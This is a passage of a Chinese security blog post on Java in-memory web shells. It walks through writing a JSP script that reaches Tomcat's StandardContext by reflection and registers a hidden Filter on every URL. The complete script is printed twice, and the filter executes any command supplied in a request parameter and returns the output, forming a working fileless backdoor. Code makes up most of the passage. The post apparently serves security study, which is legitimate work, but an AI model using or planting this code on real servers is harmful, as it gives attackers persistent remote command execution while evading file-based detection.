+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032254729.png" alt="image-20250503225458683" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032254729.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032254729.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032254729.png?size=large 2x" data-title="image-20250503225458683" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>所以我们去调用context的这里，把def和map搞进去，再去调上面的filterStart就也把filterConfig搞好了</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032214489.png" alt="image-20250503221403457" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032214489.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032214489.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032214489.png?size=large 2x" data-title="image-20250503221403457" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="编写脚本" class="heading-element"><span>编写脚本</span>
+  <a href="#%e7%bc%96%e5%86%99%e8%84%9a%e6%9c%ac" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>首先把能写的写好</p>
+<pre tabindex="0"><code class="language-jsp" data-lang="jsp">&lt;%@ page import=&#34;java.io.IOException&#34; %&gt;
+&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;
+&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContext&#34; %&gt;
+&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;
+&lt;%@ page import=&#34;javax.servlet.ServletContext&#34; %&gt;
+&lt;%@ page import=&#34;java.io.InputStream&#34; %&gt;
+&lt;%!
+  public class fuck2 implements Filter {
+    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
+            throws IOException, ServletException {
+
+      String cmd = request.getParameter(&#34;cmd2&#34;);
+
+      if (cmd != null &amp;&amp; !cmd.isEmpty()) {
+        Process process = Runtime.getRuntime().exec(cmd);
+
+        // 获取命令输出（示例：输出到响应）
+        InputStream inputStream = process.getInputStream();
+        int c;
+        while ((c = inputStream.read()) != -1) {
+          response.getWriter().write(c);
+        }
+        inputStream.close();
+        return; // 终止链条传递
+      }
+
+      // 继续处理请求
+      chain.doFilter(request, response);
+    }
+
+    public void init(FilterConfig filterConfig) throws ServletException {
+      // 初始化操作（可留空）
+    }
+    public void destroy() {
+      // 资源销毁（可留空）
+    }
+
+
+  }
+%&gt;
+
+&lt;%
+  try {
+    // 获取 servletContext 对象
+    ServletContext servletContext = request.getSession().getServletContext();
+
+    // 通过反射获取 ApplicationContext（org.apache.catalina.core.ApplicationContext）
+    Field applicationContextField = servletContext.getClass().getDeclaredField(&#34;context&#34;);
+    applicationContextField.setAccessible(true);
+    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
+
+    // 通过 ApplicationContext 获取 StandardContext（代表当前 webapp）
+    Field standardContextField = applicationContext.getClass().getDeclaredField(&#34;context&#34;);
+    standardContextField.setAccessible(true);
+    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
+
+
+
+    standardContext.addFilterDef();
+    standardContext.addFilterMap();
+    standardContext.filterStart();
+
+    out.println(&#34;Inject success.&#34;);
+  } catch (Exception e) {
+    e.printStackTrace();
+  }
+%&gt;</code></pre><p>接下来往里构造</p>
+<pre tabindex="0"><code>    FilterDef  filterDef =new FilterDef();
+    filterDef.setFilterName(&#34;fuck2&#34;);
+    filterDef.setFilter(new fuck2());
+    filterDef.setFilterClass(fuck2.class.getName());
+
+    FilterMap  filterMap = new FilterMap();
+    filterMap.setFilterName(&#34;fuck2&#34;);
+    filterMap.addURLPattern(&#34;/*&#34;);
+
+    standardContext.addFilterDef(filterDef);
+    standardContext.addFilterMap(filterMap);
+    standardContext.filterStart();</code></pre><p>完整脚本</p>
+<pre tabindex="0"><code class="language-jsp" data-lang="jsp">&lt;%@ page import=&#34;java.io.IOException&#34; %&gt;
+&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;
+&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContext&#34; %&gt;
+&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;
+&lt;%@ page import=&#34;javax.servlet.ServletContext&#34; %&gt;
+&lt;%@ page import=&#34;java.io.InputStream&#34; %&gt;
+&lt;%@ page import=&#34;org.apache.tomcat.util.descriptor.web.FilterDef&#34; %&gt;
+&lt;%@ page import=&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34; %&gt;
+&lt;%!
+  public class fuck2 implements Filter {
+    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
+            throws IOException, ServletException {
+
+      String cmd = request.getParameter(&#34;cmd2&#34;);
+
+      if (cmd != null &amp;&amp; !cmd.isEmpty()) {
+        Process process = Runtime.getRuntime().exec(cmd);
+
+        // 获取命令输出（示例：输出到响应）
+        InputStream inputStream = process.getInputStream();
+        int c;
+        while ((c = inputStream.read()) != -1) {
+          response.getWriter().write(c);
+        }
+        inputStream.close();
+        return; // 终止链条传递
+      }
+
+      // 继续处理请求
+      chain.doFilter(request, response);
+    }
+
+    public void init(FilterConfig filterConfig) throws ServletException {
+      // 初始化操作（可留空）
+    }
+    public void destroy() {
+      // 资源销毁（可留空）
+    }
+
+
+  }
+%&gt;
+
+&lt;%
+  try {
+    // 获取 servletContext 对象
+    ServletContext servletContext = request.getSession().getServletContext();
+
+    // 通过反射获取 ApplicationContext（org.apache.catalina.core.ApplicationContext）
+    Field applicationContextField = servletContext.getClass().getDeclaredField(&#34;context&#34;);
+    applicationContextField.setAccessible(true);
+    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
+
+    // 通过 ApplicationContext 获取 StandardContext（代表当前 webapp）
+    Field standardContextField = applicationContext.getClass().getDeclaredField(&#34;context&#34;);
+    standardContextField.setAccessible(true);
+    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
+
+    FilterDef  filterDef =new FilterDef();
+    filterDef.setFilterName(&#34;fuck2&#34;);
+    filterDef.setFilter(new fuck2());
+    filterDef.setFilterClass(fuck2.class.getName());
+
+    FilterMap  filterMap = new FilterMap();
+    filterMap.setFilterName(&#34;fuck2&#34;);
+    filterMap.addURLPattern(&#34;/*&#34;);
+
+    standardContext.addFilterDef(filterDef);
+    standardContext.addFilterMap(filterMap);
+    standardContext.filterStart();
+
+    out.println(&#34;Inject success.&#34;);
+  } catch (Exception e) {
+    e.printStackTrace();
+  }
+%&gt;</code></pre><p>访问</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032313715.png" alt="image-20250503231341675" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032313715.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032313715.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032313715.png?size=large 2x" data-title="image-20250503231341675" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>注入成功</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032313111.png" alt="image-20250503231358064" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032313111.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032313111.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505032313111.png?size=large 2x" data-title="image-20250503231358064" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2025-05-03 23:05:01">Updated on 2025-05-03&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag" title="Tags - 代码审计">代码审计</a><a href="/tags/java%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Java安全">Java安全</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E6%9C%A8%E9%A9%AC/java%E5%86%85%E5%AD%98%E9%A9%AC-servlet/" class="post-nav-item" rel="prev" title="Java内存马-Servlet"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Java内存马-Servlet</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
